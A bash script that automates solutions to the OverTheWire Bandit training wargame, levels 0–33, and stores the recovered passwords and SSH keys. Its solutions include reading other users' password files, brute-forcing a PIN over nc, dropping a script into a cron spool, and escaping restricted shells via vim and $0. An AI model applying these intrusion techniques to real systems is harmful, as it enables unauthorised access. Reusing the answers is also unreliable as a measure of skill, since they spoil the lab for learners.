#!/usr/bin/env bash

set -euo pipefail

HOST="${BANDIT_HOST:-bandit.labs.overthewire.org}"
PORT="${BANDIT_PORT:-2220}"

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO_ROOT="$(cd "$SCRIPT_DIR/.." && pwd)"
PASSFILE="$REPO_ROOT/bandit-passwords.txt"
KEY_DIR="$REPO_ROOT/.bandit-keys"

mkdir -p "$KEY_DIR"
chmod 700 "$KEY_DIR"
touch "$PASSFILE"
chmod 600 "$PASSFILE"

die() {
  echo "error: $*" >&2
  exit 1
}

need_command() {
  command -v "$1" >/dev/null 2>&1 || die "missing required command: $1"
}

check_dependencies() {
  need_command expect
  need_command ssh
  need_command git
  need_command perl
  need_command awk
  need_command grep
  need_command mktemp
}

save_password_value() {
  local user="$1"
  local password="$2"

  grep -v "^${user}:" "$PASSFILE" > "${PASSFILE}.tmp" || true
  mv "${PASSFILE}.tmp" "$PASSFILE"
  echo "${user}: ${password}" >> "$PASSFILE"
  chmod 600 "$PASSFILE"
}

get_saved_password() {
  local user="$1"
  awk -F': ' -v user="$user" '$1 == user { print substr($0, length(user) + 3) }' "$PASSFILE" | tail -n 1
}

extract_passwords() {
  local input

  if [[ $# -gt 0 ]]; then
    input="$1"
  else
    input="$(cat)"
  fi

  printf '%s\n' "$input" \
    | perl -pe 's/\e\[[0-?]*[ -\/]*[@-~]//g; s/\eP.*?\e\\//gs; s/\e\].*?(?:\a|\e\\)//gs; s/\e.//g' \
    | tr -d '\r' \
    | grep -Eo '[[:alnum:]]{32}' || true
}

extract_password() {
  local output
  local password

  if [[ $# -gt 0 ]]; then
    output="$1"
  else
    output="$(cat)"
  fi

  password="$(extract_passwords "$output" | tail -n 1)"
  if [[ -z "$password" ]]; then
    echo "Failed to extract a 32-character password from output:" >&2
    printf '%s\n' "$output" >&2
    return 1
  fi

  printf '%s\n' "$password"
}

extract_private_key() {
  awk '/-----BEGIN .*PRIVATE KEY-----/{flag=1} flag{print} /-----END .*PRIVATE KEY-----/{flag=0}'
}

save_private_key() {
  local name="$1"
  local output="$2"
  local key_file="$KEY_DIR/$name"

  printf '%s\n' "$output" | extract_private_key > "$key_file"
  chmod 600 "$key_file"

  if ! grep -q '^-----BEGIN .*PRIVATE KEY-----' "$key_file"; then
    rm -f "$key_file"
    echo "Failed to extract private key $name from output:" >&2
    printf '%s\n' "$output" >&2
    return 1
  fi

  printf '%s\n' "$key_file"
}

run_password_ssh_command() {
  local user="$1"
  local password="$2"
  local command_text="$3"

  BANDIT_HOST_VALUE="$HOST" \
  BANDIT_PORT_VALUE="$PORT" \
  BANDIT_USER_VALUE="$user" \
  BANDIT_PASSWORD_VALUE="$password" \
  BANDIT_COMMAND_VALUE="$command_text" \
  expect <<'EOF'
set timeout 180
spawn -noecho ssh \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -o LogLevel=ERROR \
  -o PubkeyAuthentication=no \
  -o PreferredAuthentications=password \
  -o NumberOfPasswordPrompts=1 \
  -p $env(BANDIT_PORT_VALUE) \
  $env(BANDIT_USER_VALUE)@$env(BANDIT_HOST_VALUE) \
  $env(BANDIT_COMMAND_VALUE)
expect {
  "*password:" {
    send -- "$env(BANDIT_PASSWORD_VALUE)\r"
    exp_continue
  }
  timeout {
    exit 124
  }
  eof {
  }
}
catch wait result
exit [lindex $result 3]
EOF
}

run_key_ssh_command() {
  local user="$1"
  local key_file="$2"
  local command_text="$3"

  ssh \
    -o StrictHostKeyChecking=no \
    -o UserKnownHostsFile=/dev/null \
    -o LogLevel=ERROR \
    -o IdentitiesOnly=yes \
    -o BatchMode=yes \
    -i "$key_file" \
    -p "$PORT" \
    "${user}@${HOST}" \
    "$command_text"
}

solve_password() {
  local user="$1"
  local password="$2"
  local command_text="$3"
  local output

  if ! output="$(run_password_ssh_command "$user" "$password" "$command_text" 2>&1)"; then
    echo "SSH command failed for $user: $command_text" >&2
    printf '%s\n' "$output" >&2
    return 1
  fi

  extract_password "$output"
}

solve_path() {
  local user="$1"
  local password="$2"
  local command_text="$3"
  local output
  local path

  if ! output="$(run_password_ssh_command "$user" "$password" "$command_text" 2>&1)"; then
    echo "SSH command failed for $user: $command_text" >&2
    printf '%s\n' "$output" >&2
    return 1
  fi

  path="$(printf '%s\n' "$output" | tr -d '\r' | awk '/\/inhere\// { found = $0 } END { print found }')"
  [[ -n "$path" ]] || {
    echo "Failed to extract path from output:" >&2
    printf '%s\n' "$output" >&2
    return 1
  }

  printf '%s\n' "$path"
}

record_password() {
  local level="$1"
  local password="$2"
  local user="bandit$level"

  if [[ "$level" != "0" && ! "$password" =~ ^[[:alnum:]]{32}$ ]]; then
    die "refusing to save invalid password for $user: $password"
  fi

  save_password_value "$user" "$password"
  printf '[+] %-8s %s\n' "$user" "$password"
}

write_askpass_script() {
  local dir="$1"
  local askpass="$dir/askpass.sh"

  cat > "$askpass" <<'EOF'
#!/usr/bin/env bash
printf '%s\n' "$BANDIT_GIT_PASSWORD"
EOF
  chmod 700 "$askpass"
  printf '%s\n' "$askpass"
}

with_git_password() {
  local password="$1"
  shift

  local tmp_dir
  local askpass
  local status
  local ssh_command

  tmp_dir="$(mktemp -d)"
  askpass="$(write_askpass_script "$tmp_dir")"
  ssh_command="ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR -o PubkeyAuthentication=no -o PreferredAuthentications=password -o NumberOfPasswordPrompts=1"

  BANDIT_GIT_PASSWORD="$password" \
  GIT_SSH_COMMAND="$ssh_command" \
  SSH_ASKPASS="$askpass" \
  SSH_ASKPASS_REQUIRE=force \
  DISPLAY="${DISPLAY:-:0}" \
  "$@"
  status=$?

  rm -rf "$tmp_dir"
  return "$status"
}

git_clone_repo() {
  local user="$1"
  local password="$2"
  local remote_path="$3"
  local destination="$4"

  with_git_password "$password" git clone "ssh://${user}@${HOST}:${PORT}${remote_path}" "$destination"
}

solve_bandit26_pair() {
  local key_file="$1"
  local output
  local passwords

  if ! output="$(
    BANDIT_HOST_VALUE="$HOST" \
    BANDIT_PORT_VALUE="$PORT" \
    BANDIT_KEY_VALUE="$key_file" \
    BANDIT_COMMAND_VALUE='cat /etc/bandit_pass/bandit26; ./bandit27-do cat /etc/bandit_pass/bandit27; exit' \
    expect <<'EOF'
set timeout 90
set stty_init "rows 5 columns 80"
spawn -noecho ssh \
  -tt \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -o LogLevel=ERROR \
  -o IdentitiesOnly=yes \
  -i $env(BANDIT_KEY_VALUE) \
  -p $env(BANDIT_PORT_VALUE) \
  bandit26@$env(BANDIT_HOST_VALUE)
expect {
  -re "--More--" {
    send -- "v"
  }
  timeout {
    exit 124
  }
  eof {
    exit 1
  }
}
expect {
  -re "~" {
  }
  timeout {
    exit 124
  }
  eof {
    exit 1
  }
}
after 500
send -- "\033:set shell=/bin/bash\r"
after 500
send -- ":shell\r"
after 500
send -- "$env(BANDIT_COMMAND_VALUE)\r"
set password_count 0
expect {
  -re {[[:alnum:]]{32}} {
    incr password_count
    if {$password_count < 2} {
      exp_continue
    }
  }
  timeout {
    exit 124
  }
  eof {
    exit 1
  }
}
close
wait
exit 0
EOF
  )"; then
    echo "Failed to escape bandit26 shell." >&2
    printf '%s\n' "$output" >&2
    return 1
  fi

  passwords="$(extract_passwords "$output")"
  if [[ "$(printf '%s\n' "$passwords" | sed '/^$/d' | wc -l | tr -d ' ')" -lt 2 ]]; then
    echo "Expected two passwords from bandit26 output:" >&2
    printf '%s\n' "$output" >&2
    return 1
  fi

  printf '%s\n' "$passwords" | tail -n 2
}

solve_uppercase_shell() {
  local password="$1"
  local output

  if ! output="$(
    BANDIT_HOST_VALUE="$HOST" \
    BANDIT_PORT_VALUE="$PORT" \
    BANDIT_PASSWORD_VALUE="$password" \
    expect <<'EOF'
set timeout 60
spawn -noecho ssh \
  -tt \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -o LogLevel=ERROR \
  -o PubkeyAuthentication=no \
  -o PreferredAuthentications=password \
  -o NumberOfPasswordPrompts=1 \
  -p $env(BANDIT_PORT_VALUE) \
  bandit32@$env(BANDIT_HOST_VALUE)
expect {
  "*password:" {
    send -- "$env(BANDIT_PASSWORD_VALUE)\r"
    exp_continue
  }
  -re "WELCOME TO THE UPPERCASE SHELL|>>" {
  }
  timeout {
    exit 124
  }
}
after 500
send -- "\$0\r"
expect {
  -re {[$#] } {
  }
  timeout {
    exit 124
  }
}
send -- "cat /etc/bandit_pass/bandit33; exit\r"
expect {
  -re {[[:alnum:]]{32}} {
  }
  timeout {
    exit 124
  }
}
close
wait
exit 0
EOF
  )"; then
    echo "Failed to solve uppercase shell." >&2
    printf '%s\n' "$output" >&2
    return 1
  fi

  extract_password "$output"
}

refresh_passwords() {
  check_dependencies

  local p0 p1 p2 p3 p4 p5 p6_path p6 p7 p8 p9 p10 p11 p12 p13 p14
  local p15 p16 p17 p18 p19 p20 p21 p22 p23 p24 p25 p26 p27 p28
  local p29 p30 p31 p32 p33
  local output key_file tmp_dir repo push_output cmd passwords

  echo "Refreshing Bandit passwords via $HOST:$PORT"
  echo "Password file: $PASSFILE"
  echo "Key cache:     $KEY_DIR"
  echo

  p0="bandit0"
  record_password 0 "$p0"

  p1="$(solve_password bandit0 "$p0" "cat readme")"
  record_password 1 "$p1"

  p2="$(solve_password bandit1 "$p1" "cat ./-")"
  record_password 2 "$p2"

  p3="$(solve_password bandit2 "$p2" "cat './--spaces in this filename--'")"
  record_password 3 "$p3"

  p4="$(solve_password bandit3 "$p3" "cat inhere/...Hiding-From-You")"
  record_password 4 "$p4"

  p5="$(solve_password bandit4 "$p4" "cat inhere/-file07")"
  record_password 5 "$p5"

  p6_path="$(solve_path bandit5 "$p5" "find ~/inhere -type f -size 1033c ! -executable 2>/dev/null")"
  p6="$(solve_password bandit5 "$p5" "cat '$p6_path'")"
  record_password 6 "$p6"

  p7="$(solve_password bandit6 "$p6" "find / -user bandit7 -group bandit6 -size 33c -exec cat {} \\; 2>/dev/null || true")"
  record_password 7 "$p7"

  p8="$(solve_password bandit7 "$p7" "grep millionth data.txt")"
  record_password 8 "$p8"

  p9="$(solve_password bandit8 "$p8" "sort data.txt | uniq -u")"
  record_password 9 "$p9"

  p10="$(solve_password bandit9 "$p9" "strings data.txt | grep ===")"
  record_password 10 "$p10"

  p11="$(solve_password bandit10 "$p10" "base64 -d data.txt")"
  record_password 11 "$p11"

  p12="$(solve_password bandit11 "$p11" "tr 'A-Za-z' 'N-ZA-Mn-za-m' < data.txt")"
  record_password 12 "$p12"

  # shellcheck disable=SC2016
  cmd='tmp=$(mktemp -d); cd "$tmp" || exit 1; cp ~/data.txt data.hex; xxd -r data.hex data.bin; file=data.bin; for _ in $(seq 1 20); do type=$(file -b "$file"); case "$type" in *gzip*) mv "$file" "$file.gz"; gzip -dc "$file.gz" > next ;; *bzip2*) mv "$file" "$file.bz2"; bzip2 -dc "$file.bz2" > next ;; *tar\ archive*) mv "$file" "$file.tar"; tar -xf "$file.tar"; next_file=$(tar -tf "$file.tar" | head -n 1); cp "$next_file" next ;; *ASCII\ text*) cat "$file"; break ;; *) cat "$file"; break ;; esac; file=next; done; rm -rf "$tmp"'
  p13="$(solve_password bandit12 "$p12" "$cmd")"
  record_password 13 "$p13"

  output="$(run_password_ssh_command bandit13 "$p13" "cat sshkey.private" 2>&1)"
  key_file="$(save_private_key bandit14.key "$output")"
  p14="$(run_key_ssh_command bandit14 "$key_file" "cat /etc/bandit_pass/bandit14" | extract_password)"
  record_password 14 "$p14"

  p15="$(solve_password bandit14 "$p14" "printf '%s\n' '$p14' | nc localhost 30000")"
  record_password 15 "$p15"

  p16="$(solve_password bandit15 "$p15" "printf '%s\n' '$p15' | timeout 10 openssl s_client -connect localhost:30001 -quiet 2>/dev/null")"
  record_password 16 "$p16"

  cmd="ports=\$(nmap -p 31000-32000 --open localhost 2>/dev/null | awk '/^[0-9]+\\/tcp/ { split(\$1,a,\"/\"); print a[1] }'); for port in \$ports; do response=\$(printf '%s\n' '$p16' | timeout 8 openssl s_client -connect localhost:\$port -quiet 2>/dev/null || true); if printf '%s\n' \"\$response\" | grep -q 'BEGIN .*PRIVATE KEY'; then printf '%s\n' \"\$response\"; exit 0; fi; done; exit 1"
  output="$(run_password_ssh_command bandit16 "$p16" "$cmd" 2>&1)"
  key_file="$(save_private_key bandit17.key "$output")"
  p17="$(run_key_ssh_command bandit17 "$key_file" "cat /etc/bandit_pass/bandit17" | extract_password)"
  record_password 17 "$p17"

  p18="$(solve_password bandit17 "$p17" "diff passwords.old passwords.new || true")"
  record_password 18 "$p18"

  p19="$(solve_password bandit18 "$p18" "cat readme")"
  record_password 19 "$p19"

  p20="$(solve_password bandit19 "$p19" "./bandit20-do cat /etc/bandit_pass/bandit20")"
  record_password 20 "$p20"

  cmd="port=$((20000 + RANDOM % 10000)); out=\$(mktemp); (printf '%s\n' '$p20' | nc -l -p \$port > \$out &) ; sleep 1; ./suconnect \$port >/dev/null; sleep 1; cat \$out; rm -f \$out"
  p21="$(solve_password bandit20 "$p20" "$cmd")"
  record_password 21 "$p21"

  p22="$(solve_password bandit21 "$p21" "cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv")"
  record_password 22 "$p22"

  # shellcheck disable=SC2016
  p23="$(solve_password bandit22 "$p22" 'target=$(echo I am user bandit23 | md5sum | cut -d " " -f 1); cat /tmp/$target')"
  record_password 23 "$p23"

  local out_path="/tmp/bandit24pass.$$.$RANDOM"
  cmd="out='$out_path'; rm -f \"\$out\"; touch \"\$out\"; chmod 666 \"\$out\"; script=\$(mktemp /tmp/bandit23solve.XXXXXX); printf '%s\n' '#!/bin/bash' 'cat /etc/bandit_pass/bandit24 > $out_path' > \"\$script\"; chmod 777 \"\$script\"; cp \"\$script\" /var/spool/bandit24/foo/solve-\$\$.sh; sleep 70; cat \"\$out\"; rm -f \"\$script\" \"\$out\""
  p24="$(solve_password bandit23 "$p23" "$cmd")"
  record_password 24 "$p24"

  cmd="for pin in \$(seq -w 0 9999); do printf '%s %s\n' '$p24' \"\$pin\"; done | nc localhost 30002"
  p25="$(solve_password bandit24 "$p24" "$cmd")"
  record_password 25 "$p25"

  output="$(run_password_ssh_command bandit25 "$p25" "cat bandit26.sshkey" 2>&1)"
  key_file="$(save_private_key bandit26.key "$output")"
  passwords="$(solve_bandit26_pair "$key_file")"
  p26="$(printf '%s\n' "$passwords" | head -n 1)"
  p27="$(printf '%s\n' "$passwords" | tail -n 1)"
  record_password 26 "$p26"
  record_password 27 "$p27"

  tmp_dir="$(mktemp -d)"
  git_clone_repo bandit27-git "$p27" /home/bandit27-git/repo "$tmp_dir/repo27" >/dev/null 2>&1
  p28="$(extract_password "$(cat "$tmp_dir/repo27/README")")"
  rm -rf "$tmp_dir"
  record_password 28 "$p28"

  tmp_dir="$(mktemp -d)"
  git_clone_repo bandit28-git "$p28" /home/bandit28-git/repo "$tmp_dir/repo28" >/dev/null 2>&1
  p29="$(git -C "$tmp_dir/repo28" show HEAD~1:README.md | extract_password)"
  rm -rf "$tmp_dir"
  record_password 29 "$p29"

  tmp_dir="$(mktemp -d)"
  git_clone_repo bandit29-git "$p29" /home/bandit29-git/repo "$tmp_dir/repo29" >/dev/null 2>&1
  p30="$(git -C "$tmp_dir/repo29" show origin/dev:README.md | extract_password)"
  rm -rf "$tmp_dir"
  record_password 30 "$p30"

  tmp_dir="$(mktemp -d)"
  git_clone_repo bandit30-git "$p30" /home/bandit30-git/repo "$tmp_dir/repo30" >/dev/null 2>&1
  p31="$(git -C "$tmp_dir/repo30" show secret | extract_password)"
  rm -rf "$tmp_dir"
  record_password 31 "$p31"

  tmp_dir="$(mktemp -d)"
  repo="$tmp_dir/repo31"
  git_clone_repo bandit31-git "$p31" /home/bandit31-git/repo "$repo" >/dev/null 2>&1
  git -C "$repo" config user.email bandit-solver@example.invalid
  git -C "$repo" config user.name bandit-solver
  printf 'May I come in?\n' > "$repo/key.txt"
  git -C "$repo" add -f key.txt
  git -C "$repo" commit -m 'solve bandit31' >/dev/null 2>&1
  push_output="$(with_git_password "$p31" git -C "$repo" push origin master 2>&1 || true)"
  p32="$(extract_password "$push_output")"
  rm -rf "$tmp_dir"
  record_password 32 "$p32"

  p33="$(solve_uppercase_shell "$p32")"
  record_password 33 "$p33"

  echo
  echo "Refresh complete."
}

ssh_level() {
  local level password user

  read -rp "Bandit level number, e.g. 0, 1, 26, 33: " level
  user="bandit$level"
  password="$(get_saved_password "$user")"

  echo
  echo "Connecting to $user@$HOST -p $PORT"

  if [[ -n "$password" ]]; then
    BANDIT_HOST_VALUE="$HOST" \
    BANDIT_PORT_VALUE="$PORT" \
    BANDIT_USER_VALUE="$user" \
    BANDIT_PASSWORD_VALUE="$password" \
    expect <<'EOF'
set timeout 30
spawn ssh \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -o LogLevel=ERROR \
  -o PubkeyAuthentication=no \
  -o PreferredAuthentications=password \
  -p $env(BANDIT_PORT_VALUE) \
  $env(BANDIT_USER_VALUE)@$env(BANDIT_HOST_VALUE)
expect {
  "*password:" {
    send -- "$env(BANDIT_PASSWORD_VALUE)\r"
    interact
  }
  timeout {
    interact
  }
  eof {
  }
}
EOF
  else
    echo "No saved password for $user; SSH will prompt."
    ssh "$user@$HOST" -p "$PORT"
  fi
}

save_password_interactive() {
  local username password

  read -rp "Save password for which user? Example: bandit6: " username
  read -rsp "Password: " password
  echo

  save_password_value "$username" "$password"
  echo "Saved password for $username."
}

show_passwords() {
  echo
  if [[ ! -s "$PASSFILE" ]]; then
    echo "No passwords saved yet."
  else
    cat "$PASSFILE"
  fi
  echo
  read -rp "Press Enter to continue..."
}

show_hints() {
  cat <<'EOF'

Bandit solver coverage
======================

The refresh action currently solves bandit0 through bandit33.

Notable later levels:
- bandit13 and bandit16 save SSH private keys in .bandit-keys/
- bandit20 uses suconnect with a local nc listener
- bandit23 waits for the cron job that runs bandit24 scripts
- bandit27 through bandit31 use the git repositories over SSH
- bandit32 escapes the uppercase shell with $0

Command-line shortcuts:
  ./bandit-helper.sh --refresh
  ./bandit-helper.sh --show
  ./bandit-helper.sh --ssh 12

EOF

  read -rp "Press Enter to continue..."
}

show_menu() {
  clear
  echo "===================================="
  echo "        OverTheWire Bandit App"
  echo "===================================="
  echo
  echo "Password file: $PASSFILE"
  echo "Key cache:     $KEY_DIR"
  echo
  echo "1) SSH into a Bandit level"
  echo "2) Refresh all passwords"
  echo "3) Save/update a password"
  echo "4) Show saved passwords"
  echo "5) Show solver notes"
  echo "6) Exit"
  echo
}

usage() {
  cat <<EOF
Usage:
  $0                 Open the interactive menu
  $0 --refresh       Solve bandit0 through bandit33 and refresh $PASSFILE
  $0 --show          Print saved passwords
  $0 --ssh LEVEL     SSH into banditLEVEL, using a saved password if present
EOF
}

main_menu() {
  local choice

  while true; do
    show_menu
    read -rp "Choose an option: " choice

    case "$choice" in
      1) ssh_level ;;
      2) refresh_passwords; read -rp "Press Enter to continue..." ;;
      3) save_password_interactive; sleep 1 ;;
      4) show_passwords ;;
      5) show_hints ;;
      6) exit 0 ;;
      *) echo "Invalid option."; sleep 1 ;;
    esac
  done
}

case "${1:-}" in
  --refresh)
    refresh_passwords
    ;;
  --show)
    cat "$PASSFILE"
    ;;
  --ssh)
    [[ $# -eq 2 ]] || die "--ssh requires a level number"
    level="$2"
    user="bandit$level"
    password="$(get_saved_password "$user")"
    if [[ -n "$password" ]]; then
      BANDIT_HOST_VALUE="$HOST" \
      BANDIT_PORT_VALUE="$PORT" \
      BANDIT_USER_VALUE="$user" \
      BANDIT_PASSWORD_VALUE="$password" \
      expect <<'EOF'
set timeout 30
spawn ssh \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -o LogLevel=ERROR \
  -o PubkeyAuthentication=no \
  -o PreferredAuthentications=password \
  -p $env(BANDIT_PORT_VALUE) \
  $env(BANDIT_USER_VALUE)@$env(BANDIT_HOST_VALUE)
expect {
  "*password:" {
    send -- "$env(BANDIT_PASSWORD_VALUE)\r"
    interact
  }
  timeout {
    interact
  }
  eof {
  }
}
EOF
    else
      ssh "$user@$HOST" -p "$PORT"
    fi
    ;;
  --help|-h)
    usage
    ;;
  "")
    main_menu
    ;;
  *)
    usage
    exit 1
    ;;
esac
